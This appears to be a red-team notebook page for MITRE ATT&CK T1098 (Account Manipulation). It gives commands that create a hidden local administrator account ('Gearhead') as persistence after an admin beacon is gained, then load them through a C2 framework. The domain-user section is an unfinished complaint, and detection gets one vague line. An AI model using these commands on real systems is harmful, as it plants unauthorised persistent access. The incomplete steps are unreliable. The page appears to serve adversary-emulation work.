# [Account Manipulation](https://attack.mitre.org/techniques/T1098/)

## LOCAL USER Exploit syntax:
1. Get a beacon with local/domain administrative privileges.

2. In parrot open a blank text file and paste the following commands into it
    ```powershell
    net user /add Gearhead Squanch123;
    net localgroup administrators /add Gearhead;
    ```

3. Save the file with as Pencilvester.ps1 to /tmp

4. Run
	```sh
	sudo chmod +x /tmp/Pencilvester.ps1
	```

5.  In posh, run
    ```powershell
	pslo /tmp/Pencilvester.ps1
    ```

## DOMAIN USER Exploit syntax: 
????????????????????
new-aduser ain't fucking working

## Detection Technique:
* Monitor windows events related to account manipulation